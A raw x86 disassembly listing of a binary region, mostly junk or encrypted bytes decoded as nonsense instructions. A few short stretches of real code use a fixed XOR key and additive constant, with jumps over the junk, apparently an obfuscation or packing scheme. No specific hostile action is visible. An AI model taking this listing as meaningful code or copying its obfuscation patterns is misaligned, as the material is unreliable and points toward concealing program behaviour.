  40d5ad:	fstp   DWORD PTR [ecx+0x73559971]
  40d5b3:	push   0x64
  40d5b5:	fsin   
  40d5b7:	idiv   DWORD PTR [ecx-0x12]
  40d5ba:	mov    DWORD PTR [ecx-0x71],edx
  40d5bd:	jle    0x40d63d
  40d5bf:	and    bh,BYTE PTR [edi+0x7e]
  40d5c2:	jle    0x40d5f4
  40d5c4:	mov    cl,BYTE PTR [esi]
  40d5c6:	lock cld 
  40d5c8:	test   DWORD PTR [edx-0x35178363],ebp
  40d5ce:	or     BYTE PTR [ecx+0x10a65e2b],0xce
  40d5d5:	mov    ecx,0x78ce6907
  40d5da:	cdq    
  40d5db:	lea    esp,[ebx+eax*4]
  40d5de:	arpl   sp,si
  40d5e0:	mov    ecx,0xf520fc4e
  40d5e5:	inc    dx
  40d5e7:	adc    WORD PTR [ebx-0x32b8ee00],sp
  40d5ee:	call   0xa81c:0x9cee5427
  40d5f5:	mov    edi,0xac7b7c8
  40d5fa:	cmp    dh,BYTE PTR [ebx-0x34]
  40d5fd:	mov    eax,ds:0xa31d0bc9
  40d602:	or     edi,DWORD PTR [ebp+0x2fe89b2b]
  40d608:	out    0x7a,eax
  40d60a:	es inc ebx
  40d60c:	leave  
  40d60d:	or     ch,dh
  40d60f:	aas    
  40d610:	ret    0xf057
  40d613:	mov    DWORD PTR [ebx+0x14],ecx
  40d616:	xchg   ch,dl
  40d618:	outs   dx,DWORD PTR ds:[esi]
  40d619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d61a:	xchg   esp,eax
  40d61b:	test   BYTE PTR [esi],bl
  40d61d:	jbe    0x40d68c
  40d61f:	sar    edx,0x1a
  40d622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d623:	mulps  xmm3,xmm5
  40d626:	lahf   
  40d627:	leave  
  40d628:	jns    0x40d5e7
  40d62a:	xchg   esi,eax
  40d62b:	push   ebp
  40d62c:	mov    dh,0x9
  40d62e:	xchg   BYTE PTR [ebp-0x1c],dh
  40d631:	fld    DWORD PTR [esi]
  40d633:	and    DWORD PTR [edi-0x6e12250a],0x4280b0a5
  40d63d:	les    esi,FWORD PTR [eax]
  40d63f:	leave  
  40d640:	aas    
  40d641:	arpl   si,ax
  40d643:	dec    edi
  40d644:	in     al,dx
  40d645:	adc    ebx,ebx
  40d647:	mov    ds:0xdac76bc2,eax
  40d64c:	int    0xcb
  40d64e:	jnp    0x40d606
  40d650:	jg     0x40d687
  40d652:	cmp    eax,0x6b0bae84
  40d657:	dec    ebp
  40d658:	adc    dh,dl
  40d65a:	adc    DWORD PTR cs:[ebx-0x57],ebx
  40d65e:	adc    al,0xf9
  40d660:	pop    ebp
  40d661:	sub    bl,bh
  40d663:	push   0x5ea13fb6
  40d668:	scas   eax,DWORD PTR es:[edi]
  40d669:	push   edx
  40d66a:	mov    edx,DWORD PTR [ebx+0x28374065]
  40d670:	add    BYTE PTR [ecx],0xc1
  40d673:	arpl   WORD PTR [ebp+0x12],si
  40d676:	mov    al,0x36
  40d678:	repz pop DWORD PTR [eax+0xf3ce8b4]
  40d67f:	loopne 0x40d641
  40d681:	sar    BYTE PTR [eax-0xe5e2e5b],0x23
  40d688:	add    ebx,edi
  40d68a:	inc    ebp
  40d68b:	mov    ds:0x5d484a9a,al
  40d690:	shl    dh,1
  40d692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d693:	(bad)  
  40d695:	xor    eax,ecx
  40d697:	inc    ebx
  40d698:	or     eax,0x51c5013a
  40d69d:	adc    edi,DWORD PTR [ecx+0x15]
  40d6a0:	add    al,BYTE PTR [eax+0x11]
  40d6a3:	push   edi
  40d6a4:	inc    edi
  40d6a5:	sbb    eax,0x721427f4
  40d6aa:	js     0x40d6b4
  40d6ac:	inc    esi
  40d6ad:	jle    0x40d65e
  40d6af:	shl    DWORD PTR [ebp+0x2cf1e317],0xee
  40d6b6:	cli    
  40d6b7:	repz adc bh,dl
  40d6ba:	repz retf 0x3faf
  40d6be:	clc    
  40d6bf:	inc    ecx
  40d6c0:	push   ds
  40d6c1:	dec    esp
  40d6c2:	loop   0x40d739
  40d6c4:	jb     0x40d6ad
  40d6c6:	mov    cl,BYTE PTR [esi+0x437b7cf8]
  40d6cc:	iret   
  40d6cd:	imul   ebx,DWORD PTR [eax],0x37
  40d6d0:	gs xchg esp,eax
  40d6d2:	bound  esp,QWORD PTR [edi]
  40d6d4:	lahf   
  40d6d5:	ds jge 0x40d678
  40d6d8:	mov    edx,0x93c0258a
  40d6dd:	cmp    eax,0x39f9496c
  40d6e2:	ss mov eax,0xc3b60642
  40d6e8:	dec    ecx
  40d6e9:	call   0x7cadc31f
  40d6ee:	sub    cl,BYTE PTR [ebx+0x5435fc45]
  40d6f4:	or     BYTE PTR [ecx+0x7],dl
  40d6f7:	jmp    0x40d57a
  40d6fc:	mov    eax,DWORD PTR [ebp+0xc]
  40d6ff:	add    eax,DWORD PTR [ebp+0x8]
  40d702:	mov    DWORD PTR [ebp-0x10],eax
  40d705:	mov    eax,DWORD PTR [ebp-0x1c]
  40d708:	test   eax,eax
  40d70a:	je     0x40de47
  40d710:	mov    DWORD PTR [ebp-0x24],esi
  40d713:	push   0xb
  40d715:	jmp    0x40d85e
  40d71a:	dec    esi
  40d71b:	(bad)  
  40d71c:	xchg   ebx,eax
  40d71d:	mov    bh,0x93
  40d71f:	jae    0x40d78b
  40d721:	out    0x84,eax
  40d723:	push   ss
  40d724:	(bad)  
  40d725:	mov    WORD PTR [esi+0x53f8a64],fs
  40d72b:	lea    edi,[esi+0x7e]
  40d72e:	and    bh,BYTE PTR [edi+0x7e]
  40d731:	jle    0x40d786
  40d733:	mov    al,0xdb
  40d735:	or     DWORD PTR [edi+0x18],eax
  40d738:	mov    dl,0x47
  40d73a:	mov    BYTE PTR [ebx+ecx*1+0x78],al
  40d73e:	aaa    
  40d73f:	jl     0x40d70e
  40d741:	in     al,dx
  40d742:	jmp    0x4d0a:0x52c9c887
  40d749:	dec    edx
  40d74a:	jns    0x40d7c9
  40d74c:	repnz cld 
  40d74e:	fsub   DWORD PTR [eax+0x4724bdf2]
  40d754:	jge    0x40d77c
  40d756:	and    esp,DWORD PTR [edx]
  40d758:	sub    DWORD PTR es:[esi-0x16],edi
  40d75c:	mov    eax,DWORD PTR [esi]
  40d75e:	mov    ebp,0x162f9ef7
  40d763:	mov    dh,0x26
  40d765:	ja     0x40d781
  40d767:	jbe    0x40d6e9
  40d769:	in     al,0xf3
  40d76b:	arpl   WORD PTR [eax+0x68],cx
  40d76e:	jne    0x40d701
  40d770:	popf   
  40d771:	rol    BYTE PTR [esi-0x71476b3c],cl
  40d777:	repz mov cx,0x88da
  40d77c:	shr    BYTE PTR [esi+edi*8-0x14],1
  40d780:	jb     0x40d75d
  40d782:	dec    esp
  40d783:	fnstenv [edx+0x12]
  40d786:	sub    esp,DWORD PTR ds:0x6ef12944
  40d78c:	out    dx,al
  40d78d:	fwait
  40d78e:	in     al,dx
  40d78f:	sbb    eax,0x8d58d333
  40d794:	jne    0x40d781
  40d796:	cmp    ecx,edi
  40d798:	loop   0x40d7b3
  40d79a:	adc    al,0x1b
  40d79c:	sub    BYTE PTR [edi],bl
  40d79e:	dec    ecx
  40d79f:	sbb    DWORD PTR [edi+0x338d940a],edx
  40d7a5:	add    al,BYTE PTR [edx+0x74]
  40d7a8:	push   0x24b5311
  40d7ad:	jl     0x40d7e5
  40d7af:	test   BYTE PTR ds:0xd295447a,cl
  40d7b5:	fsubp  st(4),st
  40d7b7:	pop    es
  40d7b8:	es jo  0x40d7d3
  40d7bb:	(bad)  
  40d7bc:	jnp    0x40d742
  40d7be:	add    DWORD PTR [esi+0x22],esi
  40d7c1:	pop    edi
  40d7c2:	mov    al,ds:0x3726bdbd
  40d7c7:	sub    edi,ecx
  40d7c9:	pop    ecx
  40d7ca:	inc    esp
  40d7cb:	jno    0x40d75c
  40d7cd:	popa   
  40d7ce:	popf   
  40d7cf:	jge    0x40d832
  40d7d1:	shl    BYTE PTR [ebx-0x60b3ac57],1
  40d7d7:	jbe    0x40d78e
  40d7d9:	test   al,0x9e
  40d7db:	sbb    dh,dh
  40d7dd:	mov    esi,0x1714210a
  40d7e2:	ret    
  40d7e3:	cwde   
  40d7e4:	aas    
  40d7e5:	xor    BYTE PTR [ebp-0x5f8c3d0d],ch
  40d7eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ec:	xor    cl,BYTE PTR [ebp-0x20]
  40d7ef:	mov    dh,0x2a
  40d7f1:	xor    eax,0x236699f0
  40d7f6:	jb     0x40d821
  40d7f8:	mov    ds:0xde7cadad,eax
  40d7fd:	and    eax,0x81bff7ff
  40d802:	int    0xb0
  40d804:	inc    ebp
  40d805:	in     eax,dx
  40d806:	push   ebp
  40d807:	cmp    eax,eax
  40d809:	add    BYTE PTR [esi-0x28],ah
  40d80c:	pop    eax
  40d80d:	adc    DWORD PTR [edi+0x65f1885],esp
  40d813:	js     0x40d81d
  40d815:	icebp  
  40d816:	adc    eax,0x6fdd093f
  40d81b:	cmp    al,0xa
  40d81d:	jns    0x40d82f
  40d81f:	mov    ds:0x91cc725c,al
  40d824:	in     al,0x6b
  40d826:	xor    cl,BYTE PTR [ebp+0x77]
  40d829:	lock jb 0x40d7eb
  40d82c:	out    0x2,al
  40d82e:	into   
  40d82f:	inc    edi
  40d830:	call   0xc10c:0xc77c6f1
  40d837:	sub    ah,BYTE PTR [edi+0x14]
  40d83a:	lods   al,BYTE PTR ds:[esi]
  40d83b:	pop    ebp
  40d83c:	clc    
  40d83d:	(bad)  
  40d83f:	push   0xaed86e12
  40d844:	and    eax,0x7dafa327
  40d849:	fadd   QWORD PTR [esi+0x39]
  40d84c:	cmp    BYTE PTR [ecx-0x619c9cbe],bl
  40d852:	bound  ebp,QWORD PTR [edi-0x70]
  40d855:	rol    DWORD PTR [eax+0x5663c17f],1
  40d85b:	in     al,0x95
  40d85d:	and    eax,0x49056a59
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	push   0x290dbdce
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d841
  40d885:	add    BYTE PTR [esi],ch
  40d887:	fsubr  QWORD PTR [esi+0x791900b1]
  40d88d:	xchg   ecx,eax
  40d88e:	cs mov ecx,0xc4241b35
  40d894:	(bad)  [ebx-0x71]
  40d897:	into   
  40d898:	out    0x47,al
  40d89a:	xor    BYTE PTR [ebp-0x7b2b726f],dh
  40d8a0:	mov    edi,DWORD PTR [edx]
  40d8a2:	and    BYTE PTR [eax],ch
  40d8a4:	int    0xdc
  40d8a6:	mov    DWORD PTR [ebx],0x87c172e8
  40d8ac:	inc    ebp
  40d8ad:	test   al,0xee
  40d8af:	call   0x4830:0xc9e701f1
  40d8b6:	dec    ecx
  40d8b7:	push   ebx
  40d8b8:	sub    al,0x56
  40d8ba:	cli    
  40d8bb:	nop
  40d8bc:	pop    edi
  40d8bd:	aaa    
  40d8be:	and    BYTE PTR [eax+0x99ad1e3],0xb8
  40d8c5:	(bad)  
  40d8c6:	cli    
  40d8c7:	fnstcw WORD PTR [edx-0x18]
  40d8ca:	sbb    ecx,ebx
  40d8cc:	daa    
  40d8cd:	es popa 
  40d8cf:	ret    0xaf3e
  40d8d2:	jno    0x40d8a9
  40d8d4:	mov    esi,0xa35f2f72
  40d8d9:	xor    edi,eax
  40d8db:	lahf   
  40d8dc:	dec    ebp
  40d8dd:	cmp    BYTE PTR [edi+0x54a43783],bh
  40d8e3:	adc    DWORD PTR [edi+0x1e],0x33d1fc87
  40d8ea:	xchg   DWORD PTR [eax+0x70],esi
  40d8ed:	jp     0x40d93b
  40d8ef:	sub    bl,BYTE PTR [ebp+0x2]
  40d8f2:	popf   
  40d8f3:	sub    DWORD PTR [ecx+0x21],0xffffffa5
  40d8f7:	retf   0xc4b2
  40d8fa:	cs xchg BYTE PTR gs:[eax],ah
  40d8fe:	lea    edi,[ecx+0x52507b55]
  40d904:	lock sbb BYTE PTR ds:0xe3e7567c,bh
  40d90b:	inc    edi
  40d90c:	mov    ds:0x64746b56,eax
  40d911:	iret   
  40d912:	(bad)  [edx]
  40d914:	mov    WORD PTR [ebx],ss
  40d916:	inc    edi
  40d917:	inc    esi
  40d918:	xchg   DWORD PTR [edx],ecx
  40d91a:	int    0xee
  40d91c:	cmp    BYTE PTR [eax+0x40],0x9b
  40d920:	push   esp
  40d921:	sub    DWORD PTR [esi],eax
  40d923:	mov    ch,0x9b
  40d925:	inc    eax
  40d926:	or     bl,BYTE PTR [ebx]
  40d928:	inc    eax
  40d929:	daa    
  40d92a:	xchg   ebx,eax
  40d92b:	ficom  WORD PTR ds:0xf734b153
  40d931:	mov    al,ds:0xb723ae4a
  40d936:	add    DWORD PTR [edi+0x79cc42c4],0xd2dcca8d
  40d940:	fld    st(6)
  40d942:	(bad)  
  40d943:	(bad)  
  40d944:	pusha  
  40d945:	push   esp
  40d946:	out    0x67,eax
  40d948:	mov    ds:0x7129b8ed,al
  40d94d:	mov    esp,0x74aeef4
  40d952:	inc    eax
  40d953:	push   es
  40d954:	sub    ch,BYTE PTR [eax+eax*8+0x1c]
  40d958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d959:	dec    esp
  40d95a:	iret   
  40d95b:	fadd   DWORD PTR [edi+eiz*8]
  40d95e:	push   ebp
  40d95f:	imul   esp,edx,0x1a
  40d962:	repz cdq 
  40d964:	ret    
  40d965:	inc    eax
  40d966:	mov    eax,0x1c4f5eb9
  40d96b:	jno    0x40d95e
  40d96d:	cmp    al,0x99
  40d96f:	dec    ebp
  40d970:	push   eax
  40d971:	or     BYTE PTR [ebx+0x32b5106],dl
  40d977:	cmp    BYTE PTR [ebx+0x32653dbd],ah
  40d97d:	xor    ch,BYTE PTR [ecx+0x17c6db3a]
  40d983:	retf   0x387a
  40d986:	(bad)  
  40d987:	ins    BYTE PTR es:[edi],dx
  40d988:	sbb    al,0xaf
  40d98a:	mov    dl,0xd2
  40d98c:	das    
  40d98d:	leave  
  40d98e:	dec    esp
  40d98f:	fcmovnu st,st(2)
  40d991:	in     al,0xe6
  40d993:	xchg   edx,eax
  40d994:	mov    BYTE PTR [ebp-0x6df3c0ff],dl
  40d99a:	test   BYTE PTR [eax-0x3d],ah
  40d99d:	and    DWORD PTR [eax],edi
  40d99f:	jb     0x40d922
  40d9a1:	cmp    edx,ebp
  40d9a3:	jg     0x40d9d0
  40d9a5:	jno    0x40d9c4
  40d9a7:	push   ds
  40d9a8:	ret    0xff99
  40d9ab:	dec    eax
  40d9ac:	pushf  
  40d9ad:	(bad)  
  40d9ae:	rol    ebx,1
  40d9b0:	xchg   ebx,ecx
  40d9b2:	jmp    0x40dafb
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	push   ebp
  40d9c4:	jge    0x40da34
  40d9c6:	fisttp QWORD PTR ss:[ebx+0x7f227e7e]
  40d9cd:	jle    0x40da4d
  40d9cf:	push   cs
  40d9d0:	dec    ebx
  40d9d1:	adc    ecx,DWORD PTR [edi]
  40d9d3:	shr    BYTE PTR [edx],1
  40d9d5:	outs   dx,BYTE PTR ds:[esi]
  40d9d6:	cmp    al,0xaf
  40d9d8:	pushf  
  40d9d9:	xor    cl,BYTE PTR [esi-0x5aba81ec]
  40d9df:	dec    ebp
  40d9e0:	xlat   BYTE PTR ds:[ebx]
  40d9e1:	sbb    cl,bl
  40d9e3:	ror    BYTE PTR [esi],1
  40d9e5:	test   al,0x38
  40d9e7:	pushf  
  40d9e8:	jmp    0x95ad932e
  40d9ed:	sbb    DWORD PTR [edi],0x7d4d4366
  40d9f3:	pop    ebx
  40d9f4:	add    al,0xaf
  40d9f6:	mov    DWORD PTR [ebp+edx*4-0x508559f9],edx
  40d9fd:	rol    ebp,1
  40d9ff:	jb     0x40d9a5
  40da01:	mov    dh,0x6d
  40da03:	sbb    DWORD PTR [edi-0x35250d72],ebx
  40da09:	mov    es,WORD PTR [ebx+0x10634079]
  40da0f:	pop    edx
  40da11:	out    0x51,eax
  40da13:	push   es
  40da14:	mov    ebp,0x3afcce14
  40da19:	cdq    
  40da1a:	jp     0x40d9e5
  40da1c:	jmp    0x40da97
  40da1e:	xchg   ebp,eax
  40da1f:	lds    ecx,FWORD PTR [si-0x7e]
  40da23:	inc    esi
  40da24:	mov    DWORD PTR [ebx-0x37],esp
  40da27:	xchg   BYTE PTR [ebp-0x1],ch
  40da2a:	dec    edx
  40da2b:	nop
  40da2c:	sub    esp,ecx
  40da2e:	and    cl,ch
  40da30:	lock push ecx
  40da32:	aas    
  40da33:	ret    0xb3c5
  40da36:	sbb    edx,edx
  40da38:	outs   dx,DWORD PTR ds:[esi]
  40da39:	bound  ecx,QWORD PTR [edi+0x5d]
  40da3c:	jns    0x40d9da
  40da3e:	cwde   
  40da3f:	repz rcl edi,1
  40da42:	call   DWORD PTR [edi+0x54]
  40da45:	aad    0xd
  40da47:	retf   
  40da48:	popa   
  40da49:	pop    edx
  40da4a:	cld    
  40da4b:	das    
  40da4c:	mov    dh,0x68
  40da4e:	inc    esp
  40da4f:	mov    esp,0x8f3238f9
  40da54:	mov    ebp,0x826ed20
  40da59:	popf   
  40da5a:	push   0xffffffdc
  40da5c:	not    DWORD PTR [eax+ecx*4]
  40da5f:	cmp    ebx,DWORD PTR [edx+0x6d73637e]
  40da65:	add    ecx,eax
  40da67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da68:	scas   al,BYTE PTR es:[edi]
  40da69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da6a:	cmp    DWORD PTR [edi-0x7c],eax
  40da6d:	xchg   edx,eax
  40da6e:	cs lahf 
  40da70:	cld    
  40da71:	ds mov bh,0xf1
  40da74:	ins    BYTE PTR es:[edi],dx
  40da75:	stos   BYTE PTR es:[edi],al
  40da76:	sub    ecx,DWORD PTR [ebx+ebx*1+0x1]
  40da7a:	dec    ecx
  40da7b:	hlt    
  40da7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da7d:	cmp    bl,ch
  40da7f:	dec    esi
  40da80:	inc    edi
  40da81:	loopne 0x40da39
  40da83:	lea    ecx,[eax-0x7c676aca]
  40da89:	inc    ecx
  40da8a:	mov    gs,WORD PTR [ecx+ebx*4-0x786a838]
  40da91:	rcl    BYTE PTR ds:[eax+esi*1+0x5e45025],cl
  40da99:	inc    edx
  40da9a:	(bad)  
  40da9b:	out    dx,eax
  40da9c:	clc    
  40da9d:	out    0x8d,eax
  40da9f:	cmp    eax,edx
  40daa1:	lahf   
  40daa2:	pop    ebx
  40daa3:	and    esp,edx
  40daa5:	sub    DWORD PTR [edx+ebx*8+0x46584971],ecx
  40daac:	inc    esp
  40daad:	xchg   esp,eax
  40daae:	les    esi,FWORD PTR [edx-0x4326c8f1]
  40dab4:	jne    0x40da80
  40dab6:	inc    esi
  40dab7:	sbb    BYTE PTR [ebx-0x2c362edd],bl
  40dabd:	ja     0x40da8e
  40dabf:	xchg   esp,eax
  40dac0:	or     eax,0x1b56d4b
  40dac5:	cmp    DWORD PTR [ebp+ebp*2-0x57],eax
  40dac9:	jmp    0x80a4:0x2aec633b
  40dad0:	cmc    
  40dad1:	mov    dl,0x1f
  40dad3:	js     0x40db4b
  40dad5:	shr    BYTE PTR ds:0x2879e265,cl
  40dadb:	lods   eax,DWORD PTR ds:[esi]
  40dadc:	fdiv   DWORD PTR [edx-0x7de9e716]
  40dae2:	stc    
  40dae3:	adc    al,0xc5
  40dae5:	and    edi,DWORD PTR [edx]
  40dae7:	or     al,0x38
  40dae9:	addr16 jbe 0x40db10
  40daec:	push   ss
  40daed:	rol    dh,0x59
  40daf0:	cmc    
  40daf1:	sahf   
  40daf2:	std    
  40daf3:	inc    eax
  40daf4:	(bad)  
  40daf6:	jle    0x40dae3
  40daf8:	dec    edx
  40daf9:	or     cl,al
  40dafb:	dec    ecx
  40dafc:	mov    eax,DWORD PTR [ebp-0x1c]
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x2b6fdf0
  40db32:	mov    esi,0x8881c79f
  40db37:	jle    0x40dbb7
  40db39:	and    bh,BYTE PTR [edi+0x7e]
  40db3c:	jle    0x40dba7
  40db3e:	(bad)  
  40db3f:	xchg   ecx,eax
  40db40:	add    BYTE PTR [edi],dl
  40db42:	jmp    FWORD PTR [edx+0x69]
  40db45:	fidivr WORD PTR [ecx+0x58c73406]
  40db4b:	jns    0x40db1a
  40db4d:	pop    ebx
  40db4e:	mov    ah,BYTE PTR [edx+eax*8]
  40db51:	std    
  40db52:	(bad)  
  40db53:	inc    ebp
  40db54:	cwde   
  40db55:	xchg   DWORD PTR [esi+0x72e83670],eax
  40db5b:	bound  esp,QWORD PTR [esi+esi*4]
  40db5e:	adc    al,0x94
  40db60:	addr16 pop esp
  40db62:	push   ds
  40db63:	aaa    
  40db64:	jne    0x40db71
  40db66:	js     0x40dbaa
  40db68:	sar    DWORD PTR [ebp+eax*1-0x19],cl
  40db6c:	sbb    al,0x20
  40db6e:	sar    BYTE PTR [edi-0x25],0x3
  40db72:	cmc    
  40db73:	mov    ecx,0x8f22655b
  40db78:	sar    BYTE PTR [ebp+0x65978312],1
  40db7e:	loopne 0x40dbe7
  40db80:	dec    edi
  40db81:	inc    ecx
  40db82:	lods   al,BYTE PTR ds:[esi]
  40db83:	push   edi
  40db84:	dec    esi
  40db85:	mov    edx,0x6c46a933
  40db8a:	aas    
  40db8b:	rol    BYTE PTR [ebx+0x230471e9],1
  40db91:	push   0xffffff9a
  40db93:	ficomp WORD PTR [eax]
  40db95:	mov    dl,0x6e
  40db97:	sub    BYTE PTR [ebp+0x58ccfed8],ah
  40db9d:	pushf  
  40db9e:	adc    bl,ah
  40dba0:	adc    edi,DWORD PTR [ebx+0x29]
  40dba3:	inc    ebp
  40dba4:	xor    DWORD PTR [edi],edi
  40dba6:	mov    dl,0xa5
  40dba8:	fdivr  st,st(0)
  40dbaa:	bound  esi,QWORD PTR [edi+eax*2]
  40dbad:	iret   
  40dbae:	pop    edx
  40dbaf:	adc    edi,DWORD PTR [edx]
  40dbb1:	mov    al,ds:0x781504f8
  40dbb6:	(bad)  
  40dbb7:	or     edi,DWORD PTR [edx]
  40dbb9:	cmp    ebx,DWORD PTR ds:0xa676b3f1
  40dbbf:	xchg   edx,eax
  40dbc0:	das    
  40dbc1:	xor    eax,edi
  40dbc3:	(bad)  
  40dbc4:	rcpps  xmm0,XMMWORD PTR [edi-0x2520ffc5]
  40dbcb:	bound  edx,QWORD PTR [ebx]
  40dbcd:	mov    ch,0x54
  40dbcf:	adc    DWORD PTR [ebx+0xd],esi
  40dbd2:	enter  0x4da7,0x25
  40dbd6:	jecxz  0x40dc41
  40dbd8:	jle    0x40db65
  40dbda:	push   eax
  40dbdb:	mov    bl,0x6c
  40dbdd:	cmp    eax,0xb76d984e
  40dbe2:	dec    ecx
  40dbe3:	leave  
  40dbe4:	xor    dl,bh
  40dbe6:	cmp    esi,DWORD PTR [ebx+0x746fc46d]
  40dbec:	hlt    
  40dbed:	jnp    0x40dc51
  40dbef:	dec    ebx
  40dbf0:	bound  ebp,QWORD PTR [edx+ebx*2-0x75]
  40dbf4:	out    dx,al
  40dbf5:	mov    DWORD PTR [edx+ebx*1+0x5898dd37],esp
  40dbfc:	adc    ebx,DWORD PTR [ecx-0x5d]
  40dbff:	dec    edx
  40dc00:	cmp    dh,0xa
  40dc03:	sbb    al,0xf1
  40dc05:	ja     0x40dbd8
  40dc07:	sub    ebp,DWORD PTR [eax+0x64]
  40dc0a:	mov    ds:0x23943975,eax
  40dc0f:	or     al,0x45
  40dc11:	and    BYTE PTR [esi-0x3d],0x6c
  40dc15:	inc    eax
  40dc16:	aas    
  40dc17:	or     DWORD PTR [esi],edx
  40dc19:	cwde   
  40dc1a:	and    ax,0x431
  40dc1e:	aaa    
  40dc1f:	inc    ebp
  40dc20:	adc    bl,ch
  40dc22:	gs (bad) 
  40dc24:	cli    
  40dc25:	mov    ebp,0x29e3e65c
  40dc2a:	mov    ecx,0x58a4722a
  40dc2f:	enter  0x3069,0xba
  40dc33:	jp     0x40dca2
  40dc35:	and    cl,BYTE PTR [eax-0x1]
  40dc38:	cmp    eax,DWORD PTR [ebp-0xadd0b1b]
  40dc3e:	cmc    
  40dc3f:	fidivr WORD PTR [edx+0x49]
  40dc42:	ins    DWORD PTR es:[edi],dx
  40dc43:	popa   
  40dc44:	ds test al,0x8b
  40dc47:	loop   0x40dbd8
  40dc49:	sub    DWORD PTR [edx],0x29687fc6
  40dc4f:	sbb    ch,BYTE PTR [eax]
  40dc51:	retf   0x48be
  40dc54:	adc    BYTE PTR [esi-0x5b],0x72
  40dc58:	loop   0x40dc64
  40dc5a:	pop    es
  40dc5b:	push   ecx
  40dc5c:	cmp    BYTE PTR [ecx-0x6e],cl
  40dc5f:	xchg   esp,eax
  40dc60:	test   eax,0xb83d8947
  40dc65:	add    DWORD PTR [edi-0x3c],ebp
  40dc68:	xor    al,0x3
  40dc6a:	ret    0x558b
  40dc6d:	adc    al,0xf
  40dc6f:	scas   eax,DWORD PTR es:[edi]
  40dc70:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	adc    edx,DWORD PTR [edx]
  40dcde:	stc    
  40dcdf:	enter  0x89b5,0x7e
  40dce3:	jle    0x40dd07
  40dce5:	jg     0x40dd65
  40dce7:	jle    0x40dca8
  40dce9:	mov    ds:0xe9e176b5,eax
  40dcee:	cli    
  40dcef:	xor    dh,BYTE PTR [ebp+edx*4-0x64]
  40dcf3:	mov    cl,0x89
  40dcf5:	sbb    BYTE PTR [ecx-0x6f],ah
  40dcf8:	mov    ebp,0x736b211f
  40dcfd:	dec    esi
  40dcfe:	xlat   BYTE PTR ds:[ebx]
  40dcff:	ret    
  40dd00:	mov    dh,0x50
  40dd02:	xchg   esp,eax
  40dd03:	mov    ecx,0x58fd179f
  40dd08:	cwde   
  40dd09:	gs push eax
  40dd0b:	add    DWORD PTR [ebx],edi
  40dd0d:	js     0x40dc9f
  40dd0f:	cmp    eax,0xffda10dc
  40dd14:	stos   DWORD PTR es:[edi],eax
  40dd15:	adc    ebp,DWORD PTR [esi-0x2c]
  40dd18:	pop    ds
  40dd19:	pop    ss
  40dd1a:	(bad)  [eax-0x745b8feb]
  40dd20:	scas   eax,DWORD PTR es:[edi]
  40dd21:	rol    bh,cl
  40dd23:	dec    esp
  40dd24:	into   
  40dd25:	and    al,0x93
  40dd27:	and    BYTE PTR [ebx+0x7afcdd7e],dl
  40dd2d:	cmp    DWORD PTR [esi+0x9],0x38
  40dd31:	lock cmp BYTE PTR [eax-0xa394d12],dl
  40dd38:	add    BYTE PTR [edx+ebp*4],ah
  40dd3b:	pop    ds
  40dd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd3d:	int    0x72
  40dd3f:	push   eax
  40dd40:	jmp    0xa947:0xffe47364
  40dd47:	jg     0x40dd1d
  40dd49:	mov    al,ds:0x73a1396c
  40dd4e:	mov    DWORD PTR [esi+ebp*1],esi
  40dd51:	sar    BYTE PTR cs:[edi-0xd],0xe1
